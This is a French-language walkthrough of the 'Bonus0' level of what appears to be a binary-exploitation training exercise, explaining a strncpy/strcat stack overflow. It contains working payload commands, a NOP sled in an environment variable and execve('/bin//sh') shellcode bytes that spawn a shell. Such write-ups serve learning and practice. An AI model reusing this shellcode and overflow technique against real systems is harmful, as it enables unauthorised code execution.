## Bonus0

Au premier lancement, le binaire attend un premier argument sur l'entrée
standart, puis un deuxieme.

On observe un appel a `pp()`, qui fait deux appel a `p()`. C'est cette fonction
qui va nous intéresser. Elle affiche le caractère ` - `, lit sur l'entrée
standard, et stocke le resultat dans un buffer de `4096` bytes. Ensuite l'appel
a `strchr()` va checher le caractère `10 (\n)` dans le buffer, et le remplace
par `0 (\0)`, enfin, l'appel a `strncpy()` copie les 20 premiers bytes du buffer
dans la destination passé en argument a la fonction `p()`. 
Apres ces deux copies dans deux buffer distincs, un premier buffer est copie dans le buffer passé en parametre a pp avec un `strcpy()`. Un espace est inserré a la fin du buffer, puis la second string copié est ajoutée dans le buffer avec un `strcat()`. 

La fonction strncpy de p nous interesse particulierement, cat lorsque dst est superieur ou egal la len, la string src n'est pas terminée par un `\0`.

L'astuce ici consiste a ecrire dans le premier buffer une chaine de caracteres termine par un '\0', mais dans le second une chaine non terminée. Les deux buffers etant cote a cote, le strcpy dans pp copiera bien 20 caracteres, mais le strcat copiera 40 caracteres(les deux buffers a la suite). Le buffer originel faisant 54 caracteres, nous avons un overflow que nous pouvons exploiter a loisir.


#### Amusons nous a présent avec la mémoire

![image](https://user-images.githubusercontent.com/29956389/90001786-2a39fa00-dc92-11ea-94b4-af8989aa97d5.png)

On segfault sur `0x45444444` soit `DDDE`, l'offset est de `9` bytes. Le but est donc d'y insérer l'adresse
de notre shellcode.

On utilisera un fichier pour insérer notre input, cela sera plus facile que
d'insérer des caractères non-imprimables a la main dans GDB.

`$ python -c 'print "i"*64 + "\x0a" + "ABCDEFGHI" + "\xef\xbe\xad\xde" + "\x0a"' > /tmp/xploit`

![image](https://user-images.githubusercontent.com/29956389/90002664-3ecac200-dc93-11ea-8bb9-36ca70d1177b.png)

On obtient un `SIGSEGV` sur une adresse différente, et dans la fonction `p()`,
bizarre. Observons ce qui se passe avec un breakpoint avant l'appel a `strchr()`:

![image](https://user-images.githubusercontent.com/29956389/90003198-07104a00-dc94-11ea-818b-b6eecc69e87d.png)

On observe que la premier ligne `iiii...` est évalué une deuxième fois par
`strchr()`, alors que le `\n` a déja été remplacé par une `\0`, ce qui explique
le `SIGSEGV` a l'instruction d'apres:

![image](https://user-images.githubusercontent.com/29956389/90003648-a8979b80-dc94-11ea-877c-81d9e1f0801f.png)

Cela est du au fonctionnement de `read()` (On se souvient du GetNextLine), tout
le fichier est lu jusqu'au `\0` ou `4096` bytes. Notre ligne avec notre adresse
a executer se retrouve au mauvais endroit dans la stack! Il faut donc remplacer
`print 'i'*64 + '\x0a'` dans notre commande par `print 'i'*4095 + '\x0a'`.

On réesaye avec la commande corrigé:

`$ python -c 'print "i"*4095 + "\x0a" + "ABCDEFGHI" + "\xef\xbe\xad\xde" + "\x0a"' > /tmp/xploit`

![image](https://user-images.githubusercontent.com/29956389/90004167-7fc3d600-dc95-11ea-8834-ed5521ee6067.png)

Toujours pas! On regarde donc a nouveau l'entrée qu'on avait mit en premier pour faire segfault notre binaire au début. La seule différence est la longueur de notre deuxieme chaine de caractères. Essayons alors de rajouter quelques bytes a la fin, et prennons `20 bytes` comme référence (`strncpy(dest, &buffer, 20)`):

Soit:

`$ python -c 'print [4095 bytes] + "\n" + [9 bytes] + [4 bytes de notre adresse] + [20 - (9 + 4) = 7 bytes] + "\x0a"' > /tmp/xploit`

Ce qui donne:

`python -c 'print "i"*4095 + "\x0a" + "ABCDEFGHI" + "\xef\xbe\xad\xde" + "1234567" + "\x0a"' > /tmp/xploit`

![image](https://user-images.githubusercontent.com/29956389/90004691-5eafb500-dc96-11ea-8e7d-504a6c3fa35b.png)

Cela marche enfin !

On a maintenant le choix d'inserer notre nopsled + shellcode soit dans le
buffer, soit dans l'environement, nous choissisons la deuxieme, pour aucune
raison particulière.

`$ echo -ne
'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' > /tmp/shellcode.bin`

`$ export SLEDCODE=$(python -c 'print "\x90"*512')$(cat /tmp/shellcode.bin)`

On localise l'adresse du sled:

`(gdb)> x/4s *((char**)environ + 8)`

`> de 0xbffff6c2 a 0xbffff8f4`

`0xbffff6c2 + 256 (Taille sled / 2) = 0xbffff7c2`

Et on lance:

`python -c 'print "i"*4095 + "\x0a" + "ABCDEFGHI" + "\xc2\xf7\xff\xbf" +
"1234567" + "\x0a"' > /tmp/xploit`

![image](https://user-images.githubusercontent.com/29956389/90006073-830c9100-dc98-11ea-923a-b5efe5915dc7.png)

On essaye donc en dehors de GDB:

![image](https://user-images.githubusercontent.com/29956389/90006208-bea75b00-dc98-11ea-9826-ed0bcc70237b.png)

